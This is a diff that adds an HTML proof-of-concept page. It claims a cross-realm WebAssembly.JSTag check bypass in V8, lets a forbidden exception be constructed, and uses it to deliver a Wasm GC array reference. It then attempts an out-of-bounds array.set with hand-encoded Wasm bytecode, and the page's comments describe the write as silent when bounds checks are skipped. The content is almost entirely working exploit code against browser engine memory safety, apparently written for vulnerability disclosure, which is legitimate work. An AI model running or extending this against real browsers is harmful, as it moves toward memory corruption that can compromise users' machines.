@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<!--
+  CVE candidate: cross-realm WebAssembly.JSTag bypass → OOB write
+  Root:  wasm-js.cc:2195
+         auto js_tag = Cast<WasmTagObject>(isolate->context()->wasm_js_tag());
+         if (*tag == js_tag->tag())   ← pointer comparison uses CURRENT realm's tag
+  Bug:   passing frames[0].WebAssembly.JSTag (a different WasmExceptionTag object)
+         makes the check fail → TypeError not thrown → forbidden exception constructed
+
+  Chain:
+    1.  Bypass: construct WebAssembly.Exception with cross-realm JSTag
+    2.  Inject:  crafted exception carries a Wasm GC array as payload
+    3.  Catch:   iframe Wasm module catches via JSTag → receives array ref as externref
+    4.  Cast:    any.convert_extern + ref.cast (ref $SmallArray) → typed array ref
+    5.  OOB:    array.set with index 0xFFFFFF on a 4-element array
+                → traps in release (bounds check), silent write with --wasm-skip-bounds-checks
+-->
+<html>
+<head><title>JSTag bypass OOB PoC</title></head>
+<body>
+<pre id="log"></pre>
+<script>
+function log(msg) {
+  document.getElementById('log').textContent += msg + '\n';
+  console.log(msg);
+}
+
+// ---------------------------------------------------------------------------
+// Wasm binary (hand-encoded) for the iframe module:
+//
+// (module
+//   (type $SmallArray (array (mut i32)))          ; type 0
+//   (import "i" "t" (tag $jt (param externref))) ; imports jstag
+//   (import "i" "f" (func $f))                   ; imports do_throw callback
+//
+//   ;; Creates a 4-element i32 array
+//   (func (export "make") (result (ref $SmallArray))
+//     i32.const 4
+//     array.new_default $SmallArray
+//   )
+//
+//   ;; Triggers OOB write via JSTag catch
+//   (func (export "exploit")
+//     (local $v externref)
+//     try                          ; call JS callback which throws our exception
+//       call $f
+//     catch $jt                    ; catch via JSTag → $v = attackerValue (the array)
+//       local.set $v
+//     catch_all
+//       return                     ; unexpected exception, bail
+//     end
+//     local.get $v
+//     any.convert_extern           ; externref → anyref
+//     ref.cast (ref $SmallArray)   ; anyref → (ref $SmallArray), traps if wrong type
+//     i32.const 0x00ffffff         ; ← OOB index (array length = 4)
+//     i32.const 0x41414141         ; value to write
+//     array.set $SmallArray        ; ← CRITICAL: OOB write (trapped in release,
+//   )                              ;   silent write with --wasm-skip-bounds-checks)
+// )
+// ---------------------------------------------------------------------------
+function buildWasmBytes() {
+  return new Uint8Array([
+    // magic + version
+    0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
+
+    // Type section (id=1, size=16)
+    // 4 types:
+    //   type 0: (array (mut i32))                    → 0x5E 0x7F 0x01
+    //   type 1: (func (param externref))             → 0x60 0x01 0x6F 0x00  (tag sig)
+    //   type 2: (func () → ())                       → 0x60 0x00 0x00       ($f + exploit)
+    //   type 3: (func () → (ref 0))                  → 0x60 0x00 0x01 0x64 0x00  (make)
+    0x01, 0x10, 0x04,
+      0x5E, 0x7F, 0x01,              // type 0: array (mut i32)
+      0x60, 0x01, 0x6F, 0x00,        // type 1: (param externref)
+      0x60, 0x00, 0x00,              // type 2: ()→()
+      0x60, 0x00, 0x01, 0x64, 0x00,  // type 3: ()→(ref 0)
+
+    // Import section (id=2, size=14)
+    // import "i"."t"  tag, type 1   → exception kind 0x04, attribute 0x00
+    // import "i"."f"  func, type 2
+    0x02, 0x0E, 0x02,
+      0x01, 0x69, 0x01, 0x74, 0x04, 0x00, 0x01,  // "i"."t" tag type1
+      0x01, 0x69, 0x01, 0x66, 0x00, 0x02,         // "i"."f" func type2
+
+    // Function section (id=3, size=3): 2 defined funcs
+    // func idx 1 = make  (type 3)
+    // func idx 2 = exploit (type 2)
+    0x03, 0x03, 0x02, 0x03, 0x02,
+
+    // Export section (id=7, size=18)
+    0x07, 0x12, 0x02,
+      0x04, 0x6D, 0x61, 0x6B, 0x65, 0x00, 0x01,              // "make" func 1
+      0x07, 0x65, 0x78, 0x70, 0x6C, 0x6F, 0x69, 0x74, 0x00, 0x02, // "exploit" func 2
+
+    // Code section (id=0x0A, size=46): 2 function bodies
+    0x0A, 0x2E, 0x02,
+
+    // --- func 1: make (body size=7) ---
+    // locals: 0
+    // i32.const 4 ; array.new_default 0 ; end
+    0x07,
+      0x00,                          // 0 local decl groups
+      0x41, 0x04,                    // i32.const 4
+      0xFB, 0x07, 0x00,              // array.new_default type 0
+      0x0B,                          // end
+
+    // --- func 2: exploit (body size=36) ---
+    // locals: 1 × externref
+    // try; call $f; catch $jt; local.set 0; catch_all; return; end
+    // local.get 0; any.convert_extern; ref.cast(ref 0)
+    // i32.const 0xFFFFFF; i32.const 0x41414141; array.set 0; end
+    0x24,
+      0x01, 0x01, 0x6F,              // 1 local decl: 1 externref
+      0x06, 0x40,                    // try (void result)
+        0x10, 0x00,                  // call func 0 ($f)
+      0x07, 0x00,                    // catch tag 0 ($jt)
+        0x21, 0x00,                  // local.set 0  ($v = attackerValue)
+      0x19,                          // catch_all
+        0x0F,                        // return
+      0x0B,                          // end (try)
+      0x20, 0x00,                    // local.get 0  (externref)
+      0xFB, 0x1A,                    // any.convert_extern → anyref
+      0xFB, 0x16, 0x00,              // ref.cast (ref 0) → (ref $SmallArray)
+      0x41, 0xFF, 0xFF, 0xFF, 0x01,  // i32.const 0xFFFFFF  [OOB index, sleb128]
+      0x41, 0xC1, 0x82, 0x85, 0x8A, 0x04, // i32.const 0x41414141  [sleb128]
+      0xFB, 0x0E, 0x00,              // array.set type 0  ← CRITICAL OOB WRITE
+      0x0B,                          // end (function)
+  ]);
+}
+
+// ---------------------------------------------------------------------------
+async function main() {
+  log('=== JSTag cross-realm bypass → OOB write PoC ===\n');
+
+  // ── Step 0: iframe setup ──────────────────────────────────────────────────
+  const iframe = document.createElement('iframe');
+  iframe.src = 'about:blank';
+  document.body.appendChild(iframe);
+  await new Promise(r => setTimeout(r, 0)); // allow iframe to initialize
+
+  const iframeWebAssembly = frames[0].WebAssembly;
+  const iframeJSTag = iframeWebAssembly.JSTag;
+  log('[*] Got iframe JSTag: ' + iframeJSTag);
+
+  // ── Step 1: Bypass ───────────────────────────────────────────────────────
+  // wasm-js.cc:2195:
+  //   auto js_tag = Cast<WasmTagObject>(isolate->context()->wasm_js_tag());
+  //   if (*tag == js_tag->tag())   ← CURRENT realm's tag vs. cross-realm tag
+  //   → different WasmExceptionTag objects → pointer compare fails → no TypeError
+  let canary;
+  try {
+    // Using MAIN realm's JSTag → should throw TypeError
+    new WebAssembly.Exception(WebAssembly.JSTag, [null]);
+    log('[-] UNEXPECTED: main-realm JSTag did not throw (should not happen)');
+  } catch (e) {
+    log('[+] Expected TypeError for same-realm JSTag: ' + e.message);
+  }
+
+  try {
+    // Using IFRAME realm's JSTag → check at :2195 passes (different object)
+    canary = new WebAssembly.Exception(iframeJSTag, [null]);
+    log('[+] BYPASS: cross-realm JSTag → no TypeError!');
+    log('    e.is(iframeJSTag) = ' + canary.is(iframeJSTag));        // true
+    log('    e.is(mainJSTag)   = ' + canary.is(WebAssembly.JSTag));  // false
+  } catch (e) {
+    log('[-] bypass failed: ' + e.message);
+    return;
+  }
+
+  // ── Step 2: Compile iframe Wasm module with GC array type ─────────────────
+  const bytes = buildWasmBytes();
+  let instance;
+  let crafted_exception;
+
+  try {
+    // We pass a stub import first to compile; we'll swap the throw callback
+    // when we have the array reference ready.
+    const module = await iframeWebAssembly.compile(bytes);
+
+    // The JS callback: closed over crafted_exception, set after make() call
+    const imports = {
+      i: {
+        t: iframeJSTag,
+        f: () => { throw crafted_exception; },
+      }
+    };
+
+    instance = (await iframeWebAssembly.instantiate(module, imports)).instance;
+    log('[+] iframe Wasm module compiled+instantiated');
+  } catch (e) {
+    log('[-] Wasm compile/instantiate failed: ' + e);
+    log('    (V8 must be built with --experimental-wasm-gc)');
+    return;
+  }
+
+  // ── Step 3: Craft exception with Wasm array as payload ────────────────────
+  const smallArr = instance.exports.make();
+  log('[+] Created SmallArray(4) in iframe Wasm: ' + smallArr);
+
+  // Construct forbidden exception: JSTag + (ref $SmallArray) payload
+  crafted_exception = new WebAssembly.Exception(iframeJSTag, [smallArr]);
+  log('[+] Constructed exception with SmallArray payload');
+  log('    crafted_exception.is(iframeJSTag) = '
+      + crafted_exception.is(iframeJSTag));  // true
+  const roundtripped = crafted_exception.getArg(iframeJSTag, 0);
+  log('    getArg(iframeJSTag, 0) === smallArr: ' + (roundtripped === smallArr));
+
+  // ── Step 4: Trigger OOB write ─────────────────────────────────────────────
+  // exploit() calls import $f → throws crafted_exception
+  // Wasm catches via $jt (iframeJSTag) → receives smallArr as externref
+  // any.convert_extern → ref.cast $SmallArray → array.set[0xFFFFFF] = 0x41414141
+  log('\n[*] Triggering exploit() ...');
+  try {
+    instance.exports.exploit();
+    log('[-] exploit() returned without trap (unexpected)');
+  } catch (e) {
+    if (e instanceof WebAssembly.RuntimeError
+        && e.message.includes('out of bounds')) {
+      log('[+] TRAP: array.set[0xFFFFFF] on SmallArray(4) → OOB detected');
+      log('');
+      log('[!] CRITICAL IMPACT:');
+      log('    With --wasm-skip-bounds-checks (or a Wasm array bounds-check bypass),');
+      log('    array.set[0xFFFFFF] = 0x41414141 writes to heap at:');
+      log('    &SmallArray.elements + 0xFFFFFF * 4  bytes');
+      log('');
+      log('    Full chain without --allow-natives-syntax or Sandbox.*:');
+      log('    JSTag bypass → inject Wasm GC ref via JSTag catch →');
+      log('    any.convert_extern + ref.cast → array.set OOB write');
+    } else {
+      log('[?] Unexpected exception: ' + e);
+    }
+  }
+
+  // ── Step 5: Demonstrate the invariant violation directly ──────────────────
+  log('\n[*] Demonstrating forbidden invariant directly:');
+  log('    WebAssembly.Exception with JSTag should be UNCREATABLE per spec.');
+  log('    crafted_exception.is(iframeJSTag) = ' + crafted_exception.is(iframeJSTag));
+  log('    This state is explicitly forbidden by the WebAssembly JS API spec §6.1');
+  log('    (the JSTag check in WebAssemblyException builtin exists to prevent it)');
+  log('\n=== PoC complete ===');
+}
+
+main().catch(e => log('ERROR: ' + e));
+</script>
+</body>
+</html>
